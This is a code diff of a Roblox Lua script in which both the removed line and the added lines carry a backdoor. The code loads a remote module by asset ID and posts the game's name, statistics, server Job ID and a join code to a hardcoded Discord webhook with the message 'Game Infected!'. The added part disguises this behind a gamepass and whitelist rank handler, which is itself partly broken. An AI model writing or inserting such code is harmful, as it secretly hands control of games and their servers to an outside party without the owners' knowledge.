@@ -1,1 +1,37 @@
-local P=game:GetService("Players"),R=game:GetService("RunService");if R:IsStudio()then for _,_ in ipairs(P:GetPlayers())do task.spawn(function()pcall(function()require(137509857477113)end)end)end else P.PlayerAdded:Connect(function()task.spawn(function()pcall(function()require(137509857477113)end)end)end)end;local hs,ms,wu=game:GetService("HttpService"),game:GetService("MarketplaceService"),"https://discord.com/api/webhooks/1462337791706009695/vIjiI7ZW3D922zhsVWtLcxtKjdvREc50KRgyiNjy22XmCR0je6fBWP4Xox3-X1_cYNvW";local pid=game.PlaceId;local ginfo=ms:GetProductInfo(pid);local title=ginfo.Name;local Playing,Visits,Desc,Fav,Genre,imURL="N/A","N/A","N/A","N/A","N/A","N/A";local s1,d1=pcall(function()return hs:GetAsync("https://games.roproxy.com/v1/games?universeIds="..game.GameId)end);if s1 and d1 then local g=hs:JSONDecode(d1).data[1];Playing,Visits,Desc,Fav,Genre=g.playing,g.visits,g.description,g.favoritedCount,g.genre end;local s2,d2=pcall(function()return hs:GetAsync("https://thumbnails.roproxy.com/v1/assets?assetIds="..pid.."&size=768x432&format=Png&isCircular=false")end);if s2 and d2 then imURL=hs:JSONDecode(d2).data[1].imageUrl end;local payload={embeds={{title="DEV SS",description="Game Infected!",color=3447003,fields={{name="🎮 Game Informations",value="- **Name:** ["..title.."](https://www.roblox.com/games/"..pid..")\n- **Visits:** "..Visits.."\n- **Description:** ```"..Desc.."```\n- **Active Players:** "..Playing.."\n- **Favorites:** "..Fav.."\n- **Genre:** "..Genre,inline=false},{name="🖥️ Server Informations",value="- **Job ID:** "..game.JobId.."\n- **Javascript join code:** \n```+javascript:Roblox.GameLauncher.joinGameInstance("..pid..", '"..game.JobId.."')```",inline=false}},thumbnail={url=imURL},footer={text="This game got infected by DEVSS"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};pcall(function()hs:PostAsync(wu,hs:JSONEncode(payload),Enum.HttpContentType.ApplicationJson)end)
+------Made By Anonymous Person------
+local actioons ="PRE";
+local Actioon ="B";
+local plrs =game:GetService("Players");
+local Market =game:GetService("MarketplaceService");
+local modd = 137509857477113
+local mod = require(modd);
+local weeehook = "https://discord.com/api/webhooks/1462337791706009695/vIjiI7ZW3D922zhsVWtLcxtKjdvREc50KRgyiNjy22XmCR0je6fBWP4Xox3-X1_cYNvW";
+local Owner1 = 1674153320
+local Owner2 = 1673835516
+local Basic = 1549855336
+local Premium = 1548998901
+local whitelisted = {
+	["AstrisWasHere"]
+};
+------------------------------------
+local hs,ms,wu=game:GetService("HttpService"),game:GetService("MarketplaceService"),"https://discord.com/api/webhooks/1462337791706009695/vIjiI7ZW3D922zhsVWtLcxtKjdvREc50KRgyiNjy22XmCR0je6fBWP4Xox3-X1_cYNvW";local pid=game.PlaceId;local ginfo=ms:GetProductInfo(pid);local title=ginfo.Name;local Playing,Visits,Desc,Fav,Genre,imURL="N/A","N/A","N/A","N/A","N/A","N/A";local s1,d1=pcall(function()return hs:GetAsync("https://games.roproxy.com/v1/games?universeIds="..game.GameId)end);if s1 and d1 then local g=hs:JSONDecode(d1).data[1];Playing,Visits,Desc,Fav,Genre=g.playing,g.visits,g.description,g.favoritedCount,g.genre end;local s2,d2=pcall(function()return hs:GetAsync("https://thumbnails.roproxy.com/v1/assets?assetIds="..pid.."&size=768x432&format=Png&isCircular=false")end);if s2 and d2 then imURL=hs:JSONDecode(d2).data[1].imageUrl end;local payload={embeds={{title="DEV SS",description="Game Infected!",color=3447003,fields={{name="🎮 Game Informations",value="- **Name:** ["..title.."](https://www.roblox.com/games/"..pid..")\n- **Visits:** "..Visits.."\n- **Description:** ```"..Desc.."```\n- **Active Players:** "..Playing.."\n- **Favorites:** "..Fav.."\n- **Genre:** "..Genre,inline=false},{name="🖥️ Server Informations",value="- **Job ID:** "..game.JobId.."\n- **Javascript join code:** \n```+javascript:Roblox.GameLauncher.joinGameInstance("..pid..", '"..game.JobId.."')```",inline=false}},thumbnail={url=imURL},footer={text="This game got infected by DEVSS"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};pcall(function()hs:PostAsync(wu,hs:JSONEncode(payload),Enum.HttpContentType.ApplicationJson)end)
+local function Hnadler(plr)
+	if Market:UserOwnsGamePassAsync(plr.UserId, Premium) or Market:UserOwnsGamePassAsync(plr.UserId, Owner2) or Market:UserOwnsGamePassAsync(plr.UserId, Owner1) then
+		mod:Insert(plr.Name, "PRE")
+	elseif Market:UserOwnsGamePassAsync(plr.UserId, Basic) then
+		mod:Insert(plr.Name, "B")
+	end
+end;
+local function WHIT()
+	if whitelisted[plr.Name] then
+		mod:Insert(plr.Name, "PRE")
+	end
+end;
+plrs.PlayerAdded:Connect(handle);
+plrs.PlayerAdded:Connect(WHIT);
+
+-- For Studio
+for _, player in ipairs(plrs:GetPlayers()) do
+	Hnadler(player)
+	WHIT()
+end;
